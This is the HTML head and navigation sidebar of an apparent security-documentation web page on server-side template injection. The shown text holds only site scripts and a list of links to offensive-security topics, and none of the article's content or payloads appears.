<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="All about server-side template injection techniques, methods, payloads, how/why/when they work.">
<meta name="theme-color" content="#FFFFFF">
<meta name="color-scheme" content="light dark"><meta property="og:title" content="Server-Side Template Injection" />
<meta property="og:description" content="All about server-side template injection techniques, methods, payloads, how/why/when they work." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/server_side_template_injection/" /><meta property="article:section" content="docs" />
<meta property="article:published_time" content="2023-06-21T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-06-22T12:15:46-04:00" />
<title>Server-Side Template Injection | Gray Hat Freelancing</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>

  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-5VH24CV5RY', { 'anonymize_ip': false });
}
</script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(90832071, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/90832071" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894"
     crossorigin="anonymous"></script>
<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce="JP_uCP3IebkCUXDh6KjRmw"></script><script nonce="JP_uCP3IebkCUXDh6KjRmw">(function() {function signalGooglefcPresent() {if (!window.frames['googlefcPresent']) {if (document.body) {const iframe = document.createElement('iframe'); iframe.style = 'width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;'; iframe.style.display = 'none'; iframe.name = 'googlefcPresent'; document.body.appendChild(iframe);} else {setTimeout(signalGooglefcPresent, 0);}}}signalGooglefcPresent();})();</script>
<script>(function(){  'use strict';var aa=function(a){var b=0;return function(){return b<a.length?{done:!1,value:a[b++]}:{done:!0}}},ba="function"==typeof Object.create?Object.create:function(a){var b=function(){};b.prototype=a;return new b},k;if("function"==typeof Object.setPrototypeOf)k=Object.setPrototypeOf;else{var m;a:{var ca={a:!0},n={};try{n.__proto__=ca;m=n.a;break a}catch(a){}m=!1}k=m?function(a,b){a.__proto__=b;if(a.__proto__!==b)throw new TypeError(a+" is not extensible");return a}:null} var p=k,q=function(a,b){a.prototype=ba(b.prototype);a.prototype.constructor=a;if(p)p(a,b);else for(var c in b)if("prototype"!=c)if(Object.defineProperties){var d=Object.getOwnPropertyDescriptor(b,c);d&&Object.defineProperty(a,c,d)}else a[c]=b[c];a.v=b.prototype},r=this||self,da=function(){},t=function(a){return a};var u;var w=function(a,b){this.g=b===v?a:""};w.prototype.toString=function(){return this.g+""};var v={},x=function(a){if(void 0===u){var b=null;var c=r.trustedTypes;if(c&&c.createPolicy){try{b=c.createPolicy("goog#html",{createHTML:t,createScript:t,createScriptURL:t})}catch(d){r.console&&r.console.error(d.message)}u=b}else u=b}a=(b=u)?b.createScriptURL(a):a;return new w(a,v)};var A=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)};var B={},C=null;var D="function"===typeof Uint8Array;function E(a,b,c){return"object"===typeof a?D&&!Array.isArray(a)&&a instanceof Uint8Array?c(a):F(a,b,c):b(a)}function F(a,b,c){if(Array.isArray(a)){for(var d=Array(a.length),e=0;e<a.length;e++){var f=a[e];null!=f&&(d[e]=E(f,b,c))}Array.isArray(a)&&a.s&&G(d);return d}d={};for(e in a)Object.prototype.hasOwnProperty.call(a,e)&&(f=a[e],null!=f&&(d[e]=E(f,b,c)));return d} function ea(a){return F(a,function(b){return"number"===typeof b?isFinite(b)?b:String(b):b},function(b){var c;void 0===c&&(c=0);if(!C){C={};for(var d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),e=["+/=","+/","-_=","-_.","-_"],f=0;5>f;f++){var h=d.concat(e[f].split(""));B[f]=h;for(var g=0;g<h.length;g++){var l=h[g];void 0===C[l]&&(C[l]=g)}}}c=B[c];d=Array(Math.floor(b.length/3));e=c[64]||"";for(f=h=0;h<b.length-2;h+=3){var y=b[h],z=b[h+1];l=b[h+2];g=c[y>>2];y=c[(y&3)<< 4|z>>4];z=c[(z&15)<<2|l>>6];l=c[l&63];d[f++]=""+g+y+z+l}g=0;l=e;switch(b.length-h){case 2:g=b[h+1],l=c[(g&15)<<2]||e;case 1:b=b[h],d[f]=""+c[b>>2]+c[(b&3)<<4|g>>4]+l+e}return d.join("")})}var fa={s:{value:!0,configurable:!0}},G=function(a){Array.isArray(a)&&!Object.isFrozen(a)&&Object.defineProperties(a,fa);return a};var H;var J=function(a,b,c){var d=H;H=null;a||(a=d);d=this.constructor.u;a||(a=d?[d]:[]);this.j=d?0:-1;this.h=null;this.g=a;a:{d=this.g.length;a=d-1;if(d&&(d=this.g[a],!(null===d||"object"!=typeof d||Array.isArray(d)||D&&d instanceof Uint8Array))){this.l=a-this.j;this.i=d;break a}void 0!==b&&-1<b?(this.l=Math.max(b,a+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(c)for(b=0;b<c.length;b++)a=c[b],a<this.l?(a+=this.j,(d=this.g[a])?G(d):this.g[a]=I):(d=this.l+this.j,this.g[d]||(this.i=this.g[d]={}),(d=this.i[a])? G(d):this.i[a]=I)},I=Object.freeze(G([])),K=function(a,b){if(-1===b)return null;if(b<a.l){b+=a.j;var c=a.g[b];return c!==I?c:a.g[b]=G([])}if(a.i)return c=a.i[b],c!==I?c:a.i[b]=G([])},M=function(a,b){var c=L;if(-1===b)return null;a.h||(a.h={});if(!a.h[b]){var d=K(a,b);d&&(a.h[b]=new c(d))}return a.h[b]};J.prototype.toJSON=function(){var a=N(this,!1);return ea(a)}; var N=function(a,b){if(a.h)for(var c in a.h)if(Object.prototype.hasOwnProperty.call(a.h,c)){var d=a.h[c];if(Array.isArray(d))for(var e=0;e<d.length;e++)d[e]&&N(d[e],b);else d&&N(d,b)}return a.g},O=function(a,b){H=b=b?JSON.parse(b):null;a=new a(b);H=null;return a};J.prototype.toString=function(){return N(this,!1).toString()};var P=function(a){J.call(this,a)};q(P,J);function ha(a){var b,c=(a.ownerDocument&&a.ownerDocument.defaultView||window).document,d=null===(b=c.querySelector)||void 0===b?void 0:b.call(c,"script[nonce]");(b=d?d.nonce||d.getAttribute("nonce")||"":"")&&a.setAttribute("nonce",b)};var Q=function(a,b){b=String(b);"application/xhtml+xml"===a.contentType&&(b=b.toLowerCase());return a.createElement(b)},R=function(a){this.g=a||r.document||document};R.prototype.appendChild=function(a,b){a.appendChild(b)};var S=function(a,b,c,d,e,f){try{var h=a.g,g=Q(a.g,"SCRIPT");g.async=!0;g.src=b instanceof w&&b.constructor===w?b.g:"type_error:TrustedResourceUrl";ha(g);h.head.appendChild(g);g.addEventListener("load",function(){e();d&&h.head.removeChild(g)});g.addEventListener("error",function(){0<c?S(a,b,c-1,d,e,f):(d&&h.head.removeChild(g),f())})}catch(l){f()}};var ia=r.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),ja=r.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),ka=r.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),la=function(a,b,c){this.h=a;this.j=new R(this.h);this.g=null;this.i=[];this.l=!1;this.o=b;this.m=c},V=function(a){if(a.h.body&&!a.l){var b= function(){T(a);r.setTimeout(function(){return U(a,3)},50)};S(a.j,a.o,2,!0,function(){r[a.m]||b()},b);a.l=!0}},T=function(a){for(var b=W(1,5),c=0;c<b;c++){var d=X(a);a.h.body.appendChild(d);a.i.push(d)}b=X(a);b.style.bottom="0";b.style.left="0";b.style.position="fixed";b.style.width=W(100,110).toString()+"%";b.style.zIndex=W(2147483544,2147483644).toString();b.style["background-color"]=ma(249,259,242,252,219,229);b.style["box-shadow"]="0 0 12px #888";b.style.color=ma(0,10,0,10,0,10);b.style.display= "flex";b.style["justify-content"]="center";b.style["font-family"]="Roboto, Arial";c=X(a);c.style.width=W(80,85).toString()+"%";c.style.maxWidth=W(750,775).toString()+"px";c.style.margin="24px";c.style.display="flex";c.style["align-items"]="flex-start";c.style["justify-content"]="center";d=Q(a.j.g,"IMG");d.className=A();d.src=ia;d.style.height="24px";d.style.width="24px";d.style["padding-right"]="16px";var e=X(a),f=X(a);f.style["font-weight"]="bold";f.textContent=ja;var h=X(a);h.textContent=ka;Y(a, e,f);Y(a,e,h);Y(a,c,d);Y(a,c,e);Y(a,b,c);a.g=b;a.h.body.appendChild(a.g);b=W(1,5);for(c=0;c<b;c++)d=X(a),a.h.body.appendChild(d),a.i.push(d)},Y=function(a,b,c){for(var d=W(1,5),e=0;e<d;e++){var f=X(a);b.appendChild(f)}b.appendChild(c);c=W(1,5);for(d=0;d<c;d++)e=X(a),b.appendChild(e)},W=function(a,b){return Math.floor(a+Math.random()*(b-a))},ma=function(a,b,c,d,e,f){return"rgb("+W(Math.max(a,0),Math.min(b,255)).toString()+","+W(Math.max(c,0),Math.min(d,255)).toString()+","+W(Math.max(e,0),Math.min(f, 255)).toString()+")"},X=function(a){a=Q(a.j.g,"DIV");a.className=A();return a},U=function(a,b){0>=b||null!=a.g&&0!=a.g.offsetHeight&&0!=a.g.offsetWidth||(na(a),T(a),r.setTimeout(function(){return U(a,b-1)},50))},na=function(a){var b=a.i;var c="undefined"!=typeof Symbol&&Symbol.iterator&&b[Symbol.iterator];b=c?c.call(b):{next:aa(b)};for(c=b.next();!c.done;c=b.next())(c=c.value)&&c.parentNode&&c.parentNode.removeChild(c);a.i=[];(b=a.g)&&b.parentNode&&b.parentNode.removeChild(b);a.g=null};var pa=function(a,b,c,d,e){var f=oa(c),h=function(l){l.appendChild(f);r.setTimeout(function(){f?(0!==f.offsetHeight&&0!==f.offsetWidth?b():a(),f.parentNode&&f.parentNode.removeChild(f)):a()},d)},g=function(l){document.body?h(document.body):0<l?r.setTimeout(function(){g(l-1)},e):b()};g(3)},oa=function(a){var b=document.createElement("div");b.className=a;b.style.width="1px";b.style.height="1px";b.style.position="absolute";b.style.left="-10000px";b.style.top="-10000px";b.style.zIndex="-10000";return b};var L=function(a){J.call(this,a)};q(L,J);var qa=function(a){J.call(this,a)};q(qa,J);var ra=function(a,b){this.l=a;this.m=new R(a.document);this.g=b;this.i=K(this.g,1);b=M(this.g,2);this.o=x(K(b,4)||"");this.h=!1;b=M(this.g,13);b=x(K(b,4)||"");this.j=new la(a.document,b,K(this.g,12))};ra.prototype.start=function(){sa(this)}; var sa=function(a){ta(a);S(a.m,a.o,3,!1,function(){a:{var b=a.i;var c=r.btoa(b);if(c=r[c]){try{var d=O(P,r.atob(c))}catch(e){b=!1;break a}b=b===K(d,1)}else b=!1}b?Z(a,K(a.g,14)):(Z(a,K(a.g,8)),V(a.j))},function(){pa(function(){Z(a,K(a.g,7));V(a.j)},function(){return Z(a,K(a.g,6))},K(a.g,9),K(a.g,10),K(a.g,11))})},Z=function(a,b){a.h||(a.h=!0,a=new a.l.XMLHttpRequest,a.open("GET",b,!0),a.send())},ta=function(a){var b=r.btoa(a.i);a.l[b]&&Z(a,K(a.g,5))};(function(a,b){r[a]=function(c){for(var d=[],e=0;e<arguments.length;++e)d[e-0]=arguments[e];r[a]=da;b.apply(null,d)}})("__h82AlnkH6D91__",function(a){"function"===typeof window.atob&&(new ra(window,O(qa,window.atob(a)))).start()});}).call(this); window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hWWTQzNTA3UlV4MlBicWdSRGsxQnFnWnV6Rm5xU3hmTDZsRVcyVDRvSVhTa2QzRlZvQlpra0RHTlRvYmU1dTM5U3k4bFVROGJsNVpxQjlxWGh6Z3FuT1JBXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFY1V0czR01DdDNLNmVxTDlKQ2NFNnJwU0oxNDVZTjlXOS1SU2tFd3J3NXhMbEROSU1rdVVCcnI2QjJyY3Zia0w0dGNMOEFCV0ZFUy1idzBNWG8zcUdyTUFcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFhfdzJlbk9UVmhhN05TeVAxakR2SkJyMU1MbDhvS0Zpb0N1bm0wVWxFMEdqUGVtVUM1RFpLajFTWGxBYktHUWZWa1lvNWs0RlIzbXdvdktROVA2cWE4cmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFdNTi1PNHpRLUJENU1wakZVNWVjUVdqeGIwNHh5Yzc3akdlOEdwbjZ5VWtiemF3SkxYV3lfQ2xMWWFORVEtWER0cXJ4R1JQMzBpbjNBUnJZTXR2NHlXMWdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VnlVcTVpZThXX0JkWFlGNXo3MzhtQjBkMEcxeEFlZ1BPZHp3WGVDdFdvQW5xVVNvWndVdW00UFhMRXNpUEZ1b2oxUUFUN25WNl9XWDdjMEE1X3VacFd2UVx1MDAzZFx1MDAzZCJd");</script>
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/dom_clobbering/" class="">DOM Clobbering</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_template_injection/" class="active">Server-Side Template Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/type_juggling/" class="">Type Juggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xss_injection/" class="">XSS Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/java_rmi/" class="">Java RMI</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csv_injection/" class="">Csv Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/argument_injection/" class="">Argument Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/command_injection/" class="">Command Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_discovery/" class="">Network Discovery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/python/" class="">Python Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/ruby/" class="">Ruby Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/yaml/" class="">YAML Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/dotnet/" class="">.NET Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/exercism_solutions/" class="">Exercism Solutions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/node/" class="">Node Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/php/" class="">PHP Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/java/" class="">Insecure Deserialization - Java</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/brute_force_cracking/" class="">Brute Force Cracking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/training_grounds/" class="">Training Grounds</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/wordpress/" class="">Wordpress Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/office_attacks/" class="">Attacking Office</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/source_code_management/" class="">Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oauth/" class="">OAuth</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/race_conditions/" class="">Race Conditions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/saml_injection/" class="">SAML Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/sql_injection/" class="">SQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/apache-struts-2-cve-2013-2251-cve-2017-5638-cve-2018-11776/" class="">Apache Struts 2 Cve 2013 2251 Cve 2017 5638 Cve 2018 11776</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/apache-struts-cve-2017-9805-struts-pwn/" class="">Apache Struts Cve 2017 9805 Struts Pwn</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/apache-struts-cve-2018-11776-struts-pwn/" class="">Apache Struts Cve 2018 11776 Struts Pwn</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/citrix-cve-2019-19781/" class="">Citrix Cve 2019 19781</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/docker-api-rce/" class="">Docker API Rce</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/drupalgeddon2-cve-2018-7600/" class="">Drupalgeddon2 Cve 2018 7600</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/heartbleed-cve-2014-0160/" class="">Heartbleed Cve 2014 0160</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/jboss-cve-2015-7501/" class="">Jboss Cve 2015 7501</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/jenkins-cve-2015-8103/" class="">Jenkins Cve 2015 8103</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/jenkins-cve-2016-0792/" class="">Jenkins Cve 2016 0792</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/jenkins-groovy-console/" class="">Jenkins Groovy Console</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/log4shell/" class="">Log4 Shell</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/rails-cve-2019-5420/" class="">Rails Cve 2019 5420</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/shellshock-cve-2014-6271/" class="">Shellshock Cve 2014 6271</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/telerik-cve-2017-9248/" class="">Telerik Cve 2017 9248</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/telerik-cve-2019-18935/" class="">Telerik Cve 2019 18935</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
